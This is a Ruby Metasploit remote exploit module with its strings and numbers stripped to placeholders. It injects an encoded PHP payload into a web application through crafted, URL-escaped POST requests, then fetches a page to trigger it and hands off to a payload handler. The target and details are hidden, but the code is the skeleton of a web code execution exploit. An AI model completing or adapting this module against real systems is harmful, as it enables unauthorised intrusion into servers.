require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > false , <str> = > [ <str> ] , <str> = > ARCH_PHP , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > [ <str> ] , } , <str> = > [ [ <str> , { } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , ] , self . class ) end def exploit key = rand_text_alphanumeric ( rand ( <int> ) + <int> ) fields = rand_text_alphanumeric ( rand ( <int> ) + <int> ) len = payload . encoded . length + <int> p = <str> p << <str> p << <str> p << <str> p << len . to_s ( ) p << <str> p << payload . encoded p << <str> p = p . tr ( <str> , <str> ) p = CGI . escape ( p ) data = <str> data << key data << <str> data << fields data << p data << <str> if datastore [ <str> ] postdata = CGI . escape ( datastore [ <str> ] ) data << <str> data << postdata end print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > data } , <int> ) print_status ( <str> ) res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > data } , <int> ) print_status ( <str> ) response = send_request_raw ( { <str> = > true , <str> = > normalize_uri ( datastore [ <str> ] ) } , <int> ) handler end end 
